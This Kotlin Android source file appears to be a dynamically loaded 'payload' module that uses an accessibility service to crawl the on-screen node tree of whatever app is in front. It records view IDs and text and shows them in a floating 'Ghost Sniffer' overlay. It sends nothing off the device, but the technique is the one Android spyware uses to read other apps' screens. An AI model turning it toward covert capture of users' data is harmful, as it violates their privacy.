package com.speedster.payload

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityEvent
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File
import kotlinx.coroutines.delay

@OptIn(ExperimentalMaterial3Api::class)
class PayloadEntry : DynamicEntry {

    companion object {
        val liveNodes = mutableStateListOf<String>()
        var eventCount by mutableIntStateOf(0)
        var lastPkg by mutableStateOf("None")
        var status by mutableStateOf("Waiting for events...")
        var isSnifferBooted = false

        fun crawl(node: AccessibilityNodeInfo, depth: Int, list: MutableList<String>) {
            if (depth > 12 || list.size > 80) return
            
            val id = node.viewIdResourceName?.split("/")?.last() ?: ""
            val txt = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
            val cls = node.className?.toString()?.split(".")?.last() ?: "View"
            
            if (txt.isNotBlank() || id.isNotBlank()) {
                val indent = "  ".repeat(depth)
                list.add("$indent[$cls] ${if(id.isNotEmpty()) "#$id" else ""} -> \"$txt\"")
            }

            for (i in 0 until node.childCount) {
                val child = try { node.getChild(i) } catch (e: Exception) { null }
                if (child != null) {
                    crawl(child, depth + 1, list)
                    child.recycle()
                }
            }
        }
    }

    @Composable
    override fun Render(context: Context, resDir: File) {
        var isServiceActive by remember { mutableStateOf(DynamicEntry.activeAccessibilityService != null) }

        LaunchedEffect(Unit) {
            while(true) {
                isServiceActive = DynamicEntry.activeAccessibilityService != null
                delay(1000)
            }
        }

        if (!isSnifferBooted) {
            isSnifferBooted = true
            DynamicEntry.log("📡 Core Sniffer Engine Booted")
            DynamicEntry.accessibilityInterceptor = { event ->
                eventCount++
                val pkg = event.packageName?.toString() ?: "unknown"
                if (pkg != "unknown" && pkg != "com.speedster" && pkg != "com.android.systemui") {
                    lastPkg = pkg
                }
                
                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                if (root == null) {
                    status = "Event: ${AccessibilityEvent.eventTypeToString(event.eventType)} | Tree: NULL"
                } else {
                    status = "Event: ${AccessibilityEvent.eventTypeToString(event.eventType)} | Tree: OK"
                    val snapshot = mutableListOf<String>()
                    crawl(root, 0, snapshot)
                    root.recycle()
                    
                    Handler(Looper.getMainLooper()).post {
                        liveNodes.clear()
                        liveNodes.addAll(snapshot)
                    }
                }
            }
        }

        LaunchedEffect(isServiceActive) {
            if (isServiceActive) {
                DynamicEntry.overlayContent = {
                    FloatingHUD(eventCount, lastPkg, liveNodes.take(15))
                }
            } else {
                DynamicEntry.overlayContent = null
            }
        }

        Scaffold(
            containerColor = Color(0xFF0F0F0F),
            topBar = {
                TopAppBar(
                    title = { Text("Node Sniffer v2", color = Color.White) },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.Black)
                )
            }
        ) { padding ->
            Column(
                modifier = Modifier
                    .padding(padding)
                    .fillMaxSize()
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF1A1A1A))
                        .padding(12.dp)
                ) {
                    Text("DIAGNOSTICS", color = Color.Yellow, fontSize = 10.sp, fontWeight = FontWeight.Bold)
                    Text("Events: $eventCount", color = Color.White, fontSize = 12.sp)
                    Text("Last Pkg: $lastPkg", color = Color.White, fontSize = 12.sp)
                    Text("Status: $status", color = Color.Cyan, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                    if (isServiceActive) {
                        Text("✅ Global HUD ACTIVE (Go to another app)", color = Color.Green, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }

                if (!isServiceActive) {
                    PermissionBanner { 
                        val intent = android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                    }
                }

                LazyColumn(
                    modifier = Modifier.weight(1f).fillMaxWidth(),
                    contentPadding = PaddingValues(16.dp)
                ) {
                    items(liveNodes.size) { index ->
                        NodeItem(text = liveNodes[index])
                    }
                }
            }
        }
    }
}

@Composable
fun FloatingHUD(events: Int, pkg: String, topNodes: List<String>) {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .padding(top = 40.dp, end = 16.dp),
        contentAlignment = Alignment.TopEnd
    ) {
        Column(
            modifier = Modifier
                .background(Color(0xAA000000), shape = RoundedCornerShape(8.dp))
                .padding(8.dp)
                .width(220.dp)
        ) {
            Text("👁️ GHOST SNIFFER", color = Color.Green, fontSize = 10.sp, fontWeight = FontWeight.Bold)
            Text("Evt: $events | Pkg: $pkg", color = Color.White, fontSize = 10.sp)
            Spacer(modifier = Modifier.height(4.dp))
            topNodes.forEach { node ->
                Text(node.trim(), color = Color.Cyan, fontSize = 8.sp, maxLines = 1)
            }
        }
    }
}

@Composable
fun PermissionBanner(onAction: () -> Unit) {
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .background(Color(0xFFE74C3C))
            .clickable { onAction() }
            .padding(16.dp)
    ) {
        Text(
            "Accessibility Disabled. Tap to fix.",
            color = Color.White,
            fontWeight = FontWeight.Bold,
            modifier = Modifier.align(Alignment.Center)
        )
    }
}

@Composable
fun NodeItem(text: String) {
    Text(
        text = text,
        color = Color(0xFF00FF00),
        fontSize = 12.sp,
        fontFamily = FontFamily.Monospace,
        modifier = Modifier.padding(vertical = 2.dp)
    )
}
